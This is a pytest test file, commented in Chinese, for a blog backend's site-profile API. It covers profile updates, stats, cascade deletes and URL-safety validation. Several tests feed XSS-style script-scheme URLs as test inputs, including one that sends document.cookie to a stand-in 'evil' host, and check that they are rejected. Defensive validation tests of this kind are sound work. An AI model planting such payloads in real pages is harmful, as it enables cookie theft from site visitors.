"""站点配置、统计、健康检查，以及跨模块的级联行为。"""

from __future__ import annotations

import pytest
from httpx import AsyncClient

from tests.factories import ADMIN_PASSWORD, make_article_payload


class TestHealth:
    async def test_health_endpoint(self, client: AsyncClient) -> None:
        response = await client.get("/health")
        assert response.status_code == 200
        assert response.json()["status"] == "ok"

    async def test_root_endpoint(self, client: AsyncClient) -> None:
        response = await client.get("/")
        assert response.status_code == 200
        assert response.json()["name"]

    async def test_openapi_schema_is_generated(self, client: AsyncClient) -> None:
        """文档能生成说明所有路由的 schema 都是合法的，是很好的整体自检。"""
        response = await client.get("/api/v1/openapi.json")
        assert response.status_code == 200
        paths = response.json()["paths"]
        for expected in (
            "/api/v1/articles",
            "/api/v1/articles/{slug_or_id}",
            "/api/v1/auth/login",
            "/api/v1/categories",
            "/api/v1/tags",
            "/api/v1/attachments/upload",
            "/api/v1/comments/article/{article_id}",
            "/api/v1/site/profile",
        ):
            assert expected in paths, f"缺少路由 {expected}"


class TestProfile:
    async def test_profile_is_public(self, client: AsyncClient) -> None:
        response = await client.get("/api/v1/site/profile")
        assert response.status_code == 200
        assert response.json()["owner_name"]

    async def test_admin_updates_profile(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        response = await client.patch(
            "/api/v1/site/profile",
            json={
                "owner_name": "新的站长名",
                "headline": "新的签名",
                "skills": ["Python", "Vue"],
                "social_links": [{"label": "GitHub", "url": "https://github.com/x"}],
            },
            headers=admin_headers,
        )
        assert response.status_code == 200
        body = response.json()
        assert body["owner_name"] == "新的站长名"
        assert body["skills"] == ["Python", "Vue"]
        assert body["social_links"][0]["label"] == "GitHub"

    async def test_boolean_switch_can_be_set_to_false(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """布尔开关传 False 必须生效，不能被"跳过 None"式的过滤逻辑吃掉。"""
        response = await client.patch(
            "/api/v1/site/profile",
            json={"comment_need_approval": False, "allow_guest_comment": False},
            headers=admin_headers,
        )
        assert response.status_code == 200
        assert response.json()["comment_need_approval"] is False
        assert response.json()["allow_guest_comment"] is False

    async def test_login_entry_switch_defaults_to_on(self, client: AsyncClient) -> None:
        """默认显示登录入口：升级后的前台行为与升级前一致（迁移给 server_default=TRUE）。"""
        response = await client.get("/api/v1/site/profile")
        assert response.status_code == 200
        assert response.json()["show_login_entry"] is True

    async def test_login_entry_switch_can_be_turned_off(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """关掉之后**公开读接口**（前台真正读的那个）也必须返回 False。"""
        response = await client.patch(
            "/api/v1/site/profile",
            json={"show_login_entry": False},
            headers=admin_headers,
        )
        assert response.status_code == 200
        assert response.json()["show_login_entry"] is False
        # 回读一次：前台读的是公开 GET，只信写接口的返回值等于没验证落库
        assert (await client.get("/api/v1/site/profile")).json()["show_login_entry"] is False

    async def test_login_entry_switch_does_not_disable_login(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """关掉入口 ≠ 关闭登录：这是「入口开关」与「权限开关」的分界线。

        隐藏入口之后，站长自己还得进得去（直接访问 /login）。如果哪天有人把
        `show_login_entry` 接到登录接口或路由守卫上，站长会被自己锁在门外 ——
        这条用例让那种改动立刻变红。前台不显示入口是**渲染层**的事。
        """
        await client.patch(
            "/api/v1/site/profile",
            json={"show_login_entry": False},
            headers=admin_headers,
        )

        response = await client.post(
            "/api/v1/auth/login",
            json={"username": "admin", "password": ADMIN_PASSWORD},
        )
        assert response.status_code == 200
        assert response.json()["access_token"]

    async def test_partial_update_keeps_other_fields(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        original = (await client.get("/api/v1/site/profile")).json()
        await client.patch("/api/v1/site/profile", json={"location": "深圳"}, headers=admin_headers)
        updated = (await client.get("/api/v1/site/profile")).json()
        assert updated["location"] == "深圳"
        assert updated["about_md"] == original["about_md"]

    async def test_nullable_fields_can_be_cleared(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """可空文本/JSON 字段允许显式传 null 清空，而不是被当成「不修改」吃掉。"""
        await client.patch(
            "/api/v1/site/profile",
            json={"headline": "一句话介绍", "email": "me@example.com", "icp": "京ICP备00000000号"},
            headers=admin_headers,
        )
        response = await client.patch(
            "/api/v1/site/profile",
            json={"headline": None, "email": None, "icp": None},
            headers=admin_headers,
        )
        assert response.status_code == 200
        body = response.json()
        assert body["headline"] is None
        assert body["email"] is None
        assert body["icp"] is None


class TestProfileUrlSafety:
    """社交链接与头像也是「前端直接绑到 :href / :src」的用户可控值。

    这两个字段此前是唯一绕开 ``app.utils.url.normalize_http_url`` 的入口，
    所以用例的口径与 ``test_friend_links.py`` 的 URL 安全用例保持一致：
    伪协议一律 422（拒绝而不是静默丢弃），并通过 GET 回读确认没有落库。
    """

    @pytest.mark.parametrize(
        "bad_url",
        [
            "javascript:alert(1)",
            "JavaScript:fetch('//evil/'+document.cookie)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:msgbox(1)",
            "java\nscript:alert(1)",  # 浏览器会把换行剥掉，等价于 javascript:
        ],
    )
    async def test_dangerous_scheme_in_social_link_rejected(
        self, client: AsyncClient, admin_headers: dict[str, str], bad_url: str
    ) -> None:
        response = await client.patch(
            "/api/v1/site/profile",
            json={"social_links": [{"label": "恶意", "url": bad_url}]},
            headers=admin_headers,
        )

        assert response.status_code == 422
        # 拒绝而不是静默丢弃：回读一次，确认库里没有被写进任何社交链接
        profile = (await client.get("/api/v1/site/profile")).json()
        stored = profile.get("social_links") or []
        assert all("javascript" not in (item["url"] or "").lower() for item in stored)

    async def test_dangerous_scheme_in_avatar_rejected(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """头像同样是用户可控 URL（关于页 `<img :src>`），不能放行伪协议。"""
        response = await client.patch(
            "/api/v1/site/profile",
            json={"avatar_url": "javascript:alert(1)"},
            headers=admin_headers,
        )

        assert response.status_code == 422
        assert (await client.get("/api/v1/site/profile")).json()[
            "avatar_url"
        ] != "javascript:alert(1)"

    async def test_scheme_less_social_link_gets_https(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """没写协议的输入按同一口径补 https://，与评论 / 友链行为一致。"""
        response = await client.patch(
            "/api/v1/site/profile",
            json={"social_links": [{"label": "GitHub", "url": "github.com/example"}]},
            headers=admin_headers,
        )

        assert response.status_code == 200
        assert response.json()["social_links"][0]["url"] == "https://github.com/example"

    async def test_site_relative_social_link_is_accepted(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """站内相对路径必须被接受：种子数据里的 RSS 就是 ``/api/v1/articles``。

        第一版校验直接复用 ``normalize_http_url``，把相对路径判成「不是绝对地址」，
        于是**读接口 500** —— 种子数据自己就通不过自己的校验器。这条用例守住
        「相对路径是合法输入」，也就是「校验只判协议，不要求必须是绝对地址」。
        """
        response = await client.patch(
            "/api/v1/site/profile",
            json={"social_links": [{"label": "RSS", "url": "/api/v1/articles", "icon": "rss"}]},
            headers=admin_headers,
        )

        assert response.status_code == 200
        assert response.json()["social_links"][0]["url"] == "/api/v1/articles"
        # 回读一次：读模型（SiteProfileRead）也必须能序列化相对路径
        readback = (await client.get("/api/v1/site/profile")).json()
        assert readback["social_links"][0]["url"] == "/api/v1/articles"

    async def test_protocol_relative_social_link_rejected(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """``//evil.test/x`` 看着像站内路径，实际解析成跨域绝对地址，必须拒绝。"""
        response = await client.patch(
            "/api/v1/site/profile",
            json={"social_links": [{"label": "伪装", "url": "//evil.test/x"}]},
            headers=admin_headers,
        )

        assert response.status_code == 422

    async def test_legacy_dirty_url_still_readable(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """库里直接写进一条伪协议旧数据，读接口不能 500。

        这是本次改动的核心回归点：把校验器加在 ``SocialLink`` 上会让**响应模型**
        在 ``model_validate`` 旧数据时抛错，表现为 ``GET /api/v1/site/profile``
        整站 500。所以校验只放在写入模型（``SocialLinkInput``）上，读模型保持宽松
        —— 与 ``FriendLinkRead`` 不带校验器是同一个理由。
        """
        # 绕开写入校验，模拟「校验上线之前就已经存在的行」：直接写库
        from app.db.session import async_session_factory
        from app.repositories import SiteRepository

        async with async_session_factory() as session:
            profile = await SiteRepository(session).get_or_create_profile()
            profile.social_links = [{"label": "旧数据", "url": "javascript:alert(1)"}]
            await session.commit()

        response = await client.get("/api/v1/site/profile")

        assert response.status_code == 200
        # 读得出来（前端有 safeExternalUrl 兜底，不会把它渲染成链接）
        assert response.json()["social_links"][0]["url"] == "javascript:alert(1)"

    async def test_avatar_can_be_cleared_with_null(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """加了校验之后，「清空头像」这条路径必须仍然可用。"""
        await client.patch(
            "/api/v1/site/profile",
            json={"avatar_url": "https://example.com/a.png"},
            headers=admin_headers,
        )

        response = await client.patch(
            "/api/v1/site/profile", json={"avatar_url": None}, headers=admin_headers
        )

        assert response.status_code == 200
        assert response.json()["avatar_url"] is None

    @pytest.mark.parametrize(
        "field", ["allow_guest_comment", "comment_need_approval", "show_login_entry"]
    )
    async def test_boolean_null_is_treated_as_noop(
        self, client: AsyncClient, admin_headers: dict[str, str], field: str
    ) -> None:
        """布尔开关显式传 null 视为「不修改」——布尔列非空，写 None 只会换来 500。"""
        before = (await client.get("/api/v1/site/profile")).json()[field]
        response = await client.patch(
            "/api/v1/site/profile", json={field: None}, headers=admin_headers
        )
        assert response.status_code == 200
        assert response.json()[field] == before

    async def test_author_cannot_update_profile(
        self, client: AsyncClient, author_headers: dict[str, str]
    ) -> None:
        response = await client.patch(
            "/api/v1/site/profile", json={"owner_name": "篡改"}, headers=author_headers
        )
        assert response.status_code == 403

    async def test_invalid_email_rejected(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        response = await client.patch(
            "/api/v1/site/profile", json={"email": "not-an-email"}, headers=admin_headers
        )
        assert response.status_code == 422


class TestProfileContactQrcodes:
    """「联系站长」二维码弹层的配置（``site_profile.contact_qrcodes``）。

    这一列与 ``social_links`` 完全同构，所以用例口径也照抄 ``TestProfileUrlSafety``：
    **``image_url`` 是用户可控的 ``<img :src>``**，伪协议一律 422；
    同时因为它是**读模型也会用到**的字段，校验只能待在写模型上（见下
    ``test_legacy_dirty_qrcode_still_readable``）。
    """

    async def test_contact_qrcodes_roundtrip(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """四个字段（kind / label / image_url / value）必须原样落库并读得回来。

        刻意覆盖两种 ``image_url``：绝对地址与站内相对路径 —— 后者是二维码图片
        上传到本站媒体目录后的自然形态，不能只测外链。
        """
        payload = [
            {
                "kind": "wechat",
                "label": "微信",
                "image_url": "https://cdn.example.com/wechat.png",
                "value": "my-wechat-id",
            },
            {"kind": "qq", "label": "QQ", "image_url": "/media/qq-qr.png", "value": "12345678"},
        ]

        response = await client.patch(
            "/api/v1/site/profile", json={"contact_qrcodes": payload}, headers=admin_headers
        )

        assert response.status_code == 200
        assert response.json()["contact_qrcodes"] == payload
        # 回读公开 GET：只信写接口的返回值等于没验证落库
        readback = (await client.get("/api/v1/site/profile")).json()
        assert readback["contact_qrcodes"] == payload

    async def test_label_defaults_to_empty_string(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """``label`` 可省略，缺省是空串（不是 ``None``）。

        前端按 ``kind`` 显示「微信」/「QQ」；这里钉住的是**前后端接口约定**：
        前端只需要判 ``label === ''``，不用同时处理 ``null``。
        """
        response = await client.patch(
            "/api/v1/site/profile",
            json={"contact_qrcodes": [{"kind": "wechat", "value": "me"}]},
            headers=admin_headers,
        )

        assert response.status_code == 200
        assert response.json()["contact_qrcodes"][0]["label"] == ""
        readback = (await client.get("/api/v1/site/profile")).json()
        assert readback["contact_qrcodes"][0]["label"] == ""

    async def test_both_blank_entry_is_accepted(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """``image_url`` 与 ``value`` 都空**在数据层是合法的**（前端不渲染这一项）。

        计划里写的「两者至少填一个」是**渲染约定**，不是写入约束：后台表单上
        一行刚点「添加」还没填完就保存是常态，把它做成 422 只会让这种中间状态
        存不下来，而这两项都空本身没有任何风险（前端直接跳过不渲染）。
        这里把这个取舍钉住，避免以后有人"顺手"加一条至少填一个的校验。
        """
        response = await client.patch(
            "/api/v1/site/profile",
            json={"contact_qrcodes": [{"kind": "qq"}]},
            headers=admin_headers,
        )

        assert response.status_code == 200
        entry = response.json()["contact_qrcodes"][0]
        assert entry["image_url"] is None
        assert entry["value"] is None

    @pytest.mark.parametrize("bad_kind", ["weibo", "WECHAT", "wechat ", "", "wechat,qq"])
    async def test_unknown_kind_rejected(
        self, client: AsyncClient, admin_headers: dict[str, str], bad_kind: str
    ) -> None:
        """``kind`` 是白名单而不是自由文本：前端靠它选图标。

        多一个取值就是在渲染层多一个「没图标可画」的分支，所以非 wechat / qq
        一律 422（大写与带空格也拒——前端下拉框只会给出小写规范值，
        放行变体只会让库里出现两种形态）。
        """
        response = await client.patch(
            "/api/v1/site/profile",
            json={"contact_qrcodes": [{"kind": bad_kind, "value": "x"}]},
            headers=admin_headers,
        )

        assert response.status_code == 422
        # 演示档案的初始值是空列表（见 seed），失败的那次写入不该留下任何条目
        assert (await client.get("/api/v1/site/profile")).json()["contact_qrcodes"] == []

    @pytest.mark.parametrize(
        ("field", "too_long"),
        [
            ("label", "微" * 21),
            # 20（前缀）+ 485 = 505 > 500
            ("image_url", "https://example.com/" + "a" * 485),
            ("value", "1" * 51),
        ],
    )
    async def test_field_length_caps_enforced(
        self, client: AsyncClient, admin_headers: dict[str, str], field: str, too_long: str
    ) -> None:
        """三个文本字段的上限与读模型 ``Field(max_length=...)`` 是同一组数字。

        上限本身是**契约**：数据库列没有长度约束（JSON 里存着），
        它是唯一一道闸；改了这里就必须同步改前端输入框的 maxlength，
        所以用参数化把三个上限都变成可执行的断言。
        """
        response = await client.patch(
            "/api/v1/site/profile",
            json={"contact_qrcodes": [{"kind": "wechat", field: too_long}]},
            headers=admin_headers,
        )

        assert response.status_code == 422

    @pytest.mark.parametrize(
        "bad_url",
        [
            "javascript:alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "//evil.test/x",  # 协议相对地址：看着像站内路径，实际是跨域绝对地址
            "java\nscript:alert(1)",  # 浏览器会把换行剥掉，等价于 javascript:
        ],
    )
    async def test_dangerous_scheme_in_qrcode_rejected(
        self, client: AsyncClient, admin_headers: dict[str, str], bad_url: str
    ) -> None:
        """二维码图片同样直接绑到 ``<img :src>``，伪协议必须 422 且不落库。

        先存一条合法数据再发恶意请求：这样「回读确认没落库」才有意义 ——
        空库上做这个断言是恒真的，等于没测。
        """
        good = [
            {
                "kind": "wechat",
                "label": "微信",
                "image_url": "https://example.com/qr.png",
                "value": "me",
            }
        ]
        saved = await client.patch(
            "/api/v1/site/profile", json={"contact_qrcodes": good}, headers=admin_headers
        )
        assert saved.status_code == 200

        response = await client.patch(
            "/api/v1/site/profile",
            json={"contact_qrcodes": [{"kind": "wechat", "label": "恶意", "image_url": bad_url}]},
            headers=admin_headers,
        )

        assert response.status_code == 422
        # 整条 PATCH 被整体拒绝：库里仍然是上一次那条合法数据，没有部分写入
        assert (await client.get("/api/v1/site/profile")).json()["contact_qrcodes"] == good

    @pytest.mark.parametrize("blank", ["", "   ", "\t", "\n  "])
    async def test_blank_value_converges_to_null(
        self, client: AsyncClient, admin_headers: dict[str, str], blank: str
    ) -> None:
        """只有空白的 ``value`` 也要收敛成 ``None``——它决定前台渲不渲染那一行。

        前台的判据是 ``value !== null`` 才画「账号 + 复制」那一行，所以一个 ``"   "``
        会渲染出**空文本 + 复制按钮**：用户点复制复制到空白，而且那一行看起来像
        「二维码加载失败」。后端把「全为空白」当「没填」，前端那句 ``!== null``
        才是可信的。
        """
        response = await client.patch(
            "/api/v1/site/profile",
            json={
                "contact_qrcodes": [
                    {"kind": "wechat", "image_url": "https://example.com/qr.png", "value": blank}
                ]
            },
            headers=admin_headers,
        )

        assert response.status_code == 200, response.text
        assert response.json()["contact_qrcodes"][0]["value"] is None
        assert (await client.get("/api/v1/site/profile")).json()["contact_qrcodes"][0][
            "value"
        ] is None

    async def test_valid_value_keeps_inner_and_outer_spacing(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """**有效内容一律原样存**，只把「全为空白」判成没填。

        收敛逻辑刻意用 ``not value.strip()`` 判空、而不是 ``value.strip()`` 再存：
        「站长填什么就存什么」比「我们猜他想去掉空格」安全 —— 微信号里真出现空格时，
        静默 trim 会让读者复制到一个**看起来一样但加不上**的号。
        """
        response = await client.patch(
            "/api/v1/site/profile",
            json={"contact_qrcodes": [{"kind": "qq", "value": "  123 456  "}]},
            headers=admin_headers,
        )

        assert response.status_code == 200
        assert response.json()["contact_qrcodes"][0]["value"] == "  123 456  "

    @pytest.mark.parametrize("blank", ["   ", "\t"])
    async def test_blank_avatar_converges_to_null(
        self, client: AsyncClient, admin_headers: dict[str, str], blank: str
    ) -> None:
        """``avatar_url`` 的空白也必须收敛成 ``None``（修复「注释与行为不一致」）。

        ``_clean_avatar`` 的 docstring 一直写着「空白视为没填、统一收敛成 ``None``」，
        但实现只写了一行 ``_normalize_site_url``，而它对「非空但全是空白」是**报错**。
        于是后台把头像输入框清空（提交 ``"  "``）会换来 422 —— 前端表现成「保存失败」，
        站长改不了这个表单。这与二维码 ``image_url`` 是同一类字段、同一类坑，
        所以用同一条规则；以前那条路径从来没有用例守着，这就是它一直没被发现的原因。
        """
        await client.patch(
            "/api/v1/site/profile",
            json={"avatar_url": "https://example.com/a.png"},
            headers=admin_headers,
        )

        response = await client.patch(
            "/api/v1/site/profile", json={"avatar_url": blank}, headers=admin_headers
        )

        assert response.status_code == 200, response.text
        assert response.json()["avatar_url"] is None
        assert (await client.get("/api/v1/site/profile")).json()["avatar_url"] is None

    @pytest.mark.parametrize("blank", ["", "   ", "\t"])
    async def test_blank_image_url_converges_to_null(
        self, client: AsyncClient, admin_headers: dict[str, str], blank: str
    ) -> None:
        """空串收敛成 ``None``，**不是 422**。

        这是本字段与 ``avatar_url`` 刻意不同的地方（详见
        ``ContactQrcodeInput._clean_image_url``）：后台「清空输入框 → 保存」是
        撤下已上传二维码的唯一入口，如果照抄 ``avatar_url`` 的"空白即报错"，
        站长就换不来"保存失败"以外的任何反馈。这条用例把该决定钉死 ——
        以后谁改回 422，它会立刻变红。
        """
        url = "https://example.com/qr.png"
        first = await client.patch(
            "/api/v1/site/profile",
            json={"contact_qrcodes": [{"kind": "wechat", "image_url": url, "value": "me"}]},
            headers=admin_headers,
        )
        assert first.status_code == 200
        assert first.json()["contact_qrcodes"][0]["image_url"] == url

        response = await client.patch(
            "/api/v1/site/profile",
            json={"contact_qrcodes": [{"kind": "wechat", "image_url": blank, "value": "me"}]},
            headers=admin_headers,
        )

        assert response.status_code == 200, response.text
        assert response.json()["contact_qrcodes"][0]["image_url"] is None
        readback = (await client.get("/api/v1/site/profile")).json()
        assert readback["contact_qrcodes"][0]["image_url"] is None
        # 只清掉图片：同一行里的微信号不受影响
        assert readback["contact_qrcodes"][0]["value"] == "me"

    async def test_contact_qrcodes_can_be_cleared_with_null(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """显式 ``null`` 清空整列（它必须在 ``site_service.NULLABLE_FIELDS`` 里）。

        不在白名单里的可空字段收到 ``null`` 会被当作「不修改」，表现是
        「点了清空但数据还在」—— 所以这条用例同时守住「清空真的生效」。
        """
        await client.patch(
            "/api/v1/site/profile",
            json={"contact_qrcodes": [{"kind": "qq", "value": "12345"}]},
            headers=admin_headers,
        )

        response = await client.patch(
            "/api/v1/site/profile", json={"contact_qrcodes": None}, headers=admin_headers
        )

        assert response.status_code == 200
        assert response.json()["contact_qrcodes"] is None
        assert (await client.get("/api/v1/site/profile")).json()["contact_qrcodes"] is None

    async def test_contact_qrcodes_can_be_emptied_with_empty_list(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """空列表同样是「清空」：后台常见的形态是删掉每一行而不是传 null。

        与 ``null`` 在展示层等价（前端判 falsy），两者都必须能存进去 ——
        这里钉住的是「别把它当成"没填"跳过」。
        """
        await client.patch(
            "/api/v1/site/profile",
            json={"contact_qrcodes": [{"kind": "qq", "value": "12345"}]},
            headers=admin_headers,
        )

        response = await client.patch(
            "/api/v1/site/profile", json={"contact_qrcodes": []}, headers=admin_headers
        )

        assert response.status_code == 200
        assert response.json()["contact_qrcodes"] == []
        assert (await client.get("/api/v1/site/profile")).json()["contact_qrcodes"] == []

    async def test_new_profile_starts_with_empty_qrcodes(self, client: AsyncClient) -> None:
        """新建档案的初始值是可读的空列表，不是"字段缺失"。

        前端拿到未配置的站点时不该看到 ``null`` 与"字段不存在"两种形态；
        ``[]`` 与 ``null`` 在渲染层等价，但统一成一种能让前端只判 falsy 一次。
        """
        response = await client.get("/api/v1/site/profile")
        assert response.status_code == 200
        assert response.json()["contact_qrcodes"] == []

    async def test_legacy_dirty_qrcode_still_readable(
        self, client: AsyncClient, admin_headers: dict[str, str]
    ) -> None:
        """库里直接写进一条伪协议旧数据，读接口不能 500。

        与 ``test_legacy_dirty_url_still_readable`` 同一个回归点：把校验器加到
        ``ContactQrcode``（读模型）上，``SiteProfileRead.model_validate`` 就会在
        序列化历史数据时抛错，表现为 ``GET /api/v1/site/profile`` 整站 500。
        所以校验只属于 ``ContactQrcodeInput``。
        """
        # 绕开写入校验，模拟「校验上线之前就已经存在的行」：直接写库
        from app.db.session import async_session_factory
        from app.repositories import SiteRepository

        async with async_session_factory() as session:
            profile = await SiteRepository(session).get_or_create_profile()
            profile.contact_qrcodes = [
                {
                    "kind": "wechat",
                    "label": "旧数据",
                    "image_url": "javascript:alert(1)",
                    "value": None,
                }
            ]
            await session.commit()

        response = await client.get("/api/v1/site/profile")

        assert response.status_code == 200
        # 读得出来（前端有 safeExternalUrl 兜底，不会把它渲染成图片）
        assert response.json()["contact_qrcodes"][0]["image_url"] == "javascript:alert(1)"


class TestStats:
    async def test_stats_require_admin(
        self, client: AsyncClient, author_headers: dict[str, str]
    ) -> None:
        assert (await client.get("/api/v1/site/stats", headers=author_headers)).status_code == 403
        assert (await client.get("/api/v1/site/stats")).status_code == 401

    async def test_stats_reflect_content(
        self, client: AsyncClient, author_headers: dict[str, str], admin_headers: dict[str, str]
    ) -> None:
        await client.post("/api/v1/articles", json=make_article_payload(), headers=author_headers)
        await client.post(
            "/api/v1/articles",
            json=make_article_payload(status="draft"),
            headers=author_headers,
        )
        await client.post("/api/v1/categories", json={"name": "统计分类"}, headers=author_headers)

        stats = (await client.get("/api/v1/site/stats", headers=admin_headers)).json()
        assert stats["article_total"] == 2
        assert stats["published_total"] == 1
        assert stats["draft_total"] == 1
        assert stats["category_total"] == 1
        assert stats["tag_total"] >= 1
        assert stats["total_views"] >= 0
        assert stats["latest_published_at"] is not None

    async def test_pending_comment_counter(
        self, client: AsyncClient, published_article: dict, admin_headers: dict[str, str]
    ) -> None:
        await client.post(
            f"/api/v1/comments/article/{published_article['id']}",
            json={"author_name": "甲", "content": "待审评论"},
        )
        stats = (await client.get("/api/v1/site/stats", headers=admin_headers)).json()
        assert stats["pending_comment_total"] == 1
        assert stats["comment_total"] == 1


class TestCascade:
    """跨模块级联：这些行为靠数据库外键实现，最容易因为"没打开 FK 约束"而静默失效。"""

    async def test_deleting_article_removes_its_comments(
        self, client: AsyncClient, author_headers: dict[str, str], admin_headers: dict[str, str]
    ) -> None:
        article = (
            await client.post(
                "/api/v1/articles", json=make_article_payload(), headers=author_headers
            )
        ).json()
        await client.post(
            f"/api/v1/comments/article/{article['id']}",
            json={"author_name": "甲", "content": "会被连带删除"},
        )

        await client.delete(f"/api/v1/articles/{article['id']}", headers=author_headers)
        comments = (await client.get("/api/v1/comments", headers=admin_headers)).json()
        assert comments["total"] == 0

    async def test_deleting_user_removes_their_articles(
        self,
        client: AsyncClient,
        admin_headers: dict[str, str],
        author: dict[str, object],
    ) -> None:
        await client.post(
            "/api/v1/articles",
            json=make_article_payload(),
            headers=author["headers"],  # type: ignore[arg-type]
        )
        before = (await client.get("/api/v1/articles/manage/list", headers=admin_headers)).json()
        assert before["total"] == 1

        await client.delete(f"/api/v1/auth/users/{author['id']}", headers=admin_headers)
        after = (await client.get("/api/v1/articles/manage/list", headers=admin_headers)).json()
        assert after["total"] == 0
